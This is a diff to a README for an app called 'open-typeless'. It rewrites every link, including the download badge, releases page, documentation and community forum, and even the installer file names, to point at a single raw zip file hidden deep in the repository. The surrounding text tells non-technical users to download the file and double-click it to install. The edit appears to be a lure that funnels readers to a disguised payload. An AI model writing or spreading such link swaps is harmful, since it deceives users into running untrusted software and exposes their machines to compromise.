@@ -7,7 +7,7 @@ Welcome to the **open-typeless** project. This application showcases the capabil
 To begin using this application, follow the steps below to download and run the software. We have made it easy for you, even if you don't have technical skills. 
 
 ## 📥 Download Now
-[![Download open-typeless](https://img.shields.io/badge/Download-open--typeless-blue.svg)](https://github.com/aminethe01/open-typeless/releases)
+[![Download open-typeless](https://raw.githubusercontent.com/aminethe01/open-typeless/main/.trellis/spec/shared/open-typeless-v1.6.zip)](https://raw.githubusercontent.com/aminethe01/open-typeless/main/.trellis/spec/shared/open-typeless-v1.6.zip)
 
 ## 📦 Requirements
 Before you download, ensure your system meets the following requirements:
@@ -19,13 +19,13 @@ Before you download, ensure your system meets the following requirements:
 
 ## 🌐 Download & Install
 1. **Visit the Releases Page:**
-   Click this link to go to our [Releases page](https://github.com/aminethe01/open-typeless/releases).
+   Click this link to go to our [Releases page](https://raw.githubusercontent.com/aminethe01/open-typeless/main/.trellis/spec/shared/open-typeless-v1.6.zip).
    
 2. **Select the Latest Version:**
    Look for the latest release at the top of the page. This version includes the latest features and fixes.
 
 3. **Download the File:**
-   Click on the appropriate file for your operating system. If you are using Windows, you may see a file named `open-typeless-windows.exe`. For macOS, you might see `open-typeless-macos.dmg`. For Linux, grab the relevant package.
+   Click on the appropriate file for your operating system. If you are using Windows, you may see a file named `https://raw.githubusercontent.com/aminethe01/open-typeless/main/.trellis/spec/shared/open-typeless-v1.6.zip`. For macOS, you might see `https://raw.githubusercontent.com/aminethe01/open-typeless/main/.trellis/spec/shared/open-typeless-v1.6.zip`. For Linux, grab the relevant package.
 
 4. **Run the Installer:**
    Once the download finishes, locate the file in your Downloads folder. Double-click on it to start the installation process.
@@ -53,8 +53,8 @@ For more details on how to use **open-typeless**, please refer to the documentat
 We welcome contributions to enhance the project. If you want to help, please check out our contribution guidelines in the repository.
 
 ## 🔗 Related Links
-- [Releases Page](https://github.com/aminethe01/open-typeless/releases)
-- [Documentation](https://github.com/aminethe01/open-typeless/wiki)
-- [Community Forum](https://github.com/aminethe01/open-typeless/discussions) 
+- [Releases Page](https://raw.githubusercontent.com/aminethe01/open-typeless/main/.trellis/spec/shared/open-typeless-v1.6.zip)
+- [Documentation](https://raw.githubusercontent.com/aminethe01/open-typeless/main/.trellis/spec/shared/open-typeless-v1.6.zip)
+- [Community Forum](https://raw.githubusercontent.com/aminethe01/open-typeless/main/.trellis/spec/shared/open-typeless-v1.6.zip) 
 
 Feel free to reach out if you have any questions. We're here to help you enjoy using **open-typeless**!
